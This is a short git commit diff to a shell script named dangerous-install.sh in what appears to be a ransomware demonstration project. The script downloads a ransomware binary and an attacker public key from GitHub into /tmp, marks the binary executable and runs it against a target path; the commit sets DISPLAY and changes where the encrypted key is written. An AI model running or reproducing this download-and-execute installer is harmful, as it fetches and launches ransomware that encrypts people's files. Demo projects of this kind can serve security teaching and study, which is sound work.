56ec8d3749e2d547d94e01c8439b57b31bc4f6dd
soonann <sudo@soonann.dev>
2024-03-18 11:14:41 +0800

    WIP: display env

--- ransomware/scripts/dangerous-install.sh
+++ ransomware/scripts/dangerous-install.sh
@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
+export DISPLAY=:0
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/ransomware/dist/ransomware -O /tmp/ransomware
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/dev/soonann/attacker/public_key.pem -O /tmp/public_key.pem
 chmod +x /tmp/ransomware
-/tmp/ransomware --pub /tmp/public_key.pem --path /home/ubuntu/development/yet-another-ransomware-demo/ransomware/os_root --enc-sym-key /home/$USER
+/tmp/ransomware --pub /tmp/public_key.pem --path /home/ubuntu/development/yet-another-ransomware-demo/ransomware/os_root --enc-sym-key ~/
